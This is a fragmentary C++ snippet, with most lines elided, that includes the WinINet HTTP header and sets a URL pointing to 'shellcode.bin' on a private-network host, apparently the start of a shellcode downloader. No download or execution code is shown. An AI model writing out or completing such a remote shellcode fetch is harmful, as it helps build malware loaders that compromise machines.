...
#include <iostream>
#include <string>
#include <wininet.h>  // For InternetOpen and InternetOpenUrl functions (if using WinINet for HTTP requests)
...
int main() {
    ...
    std::string url = "http://192.168.217.131:8080/shellcode.bin";
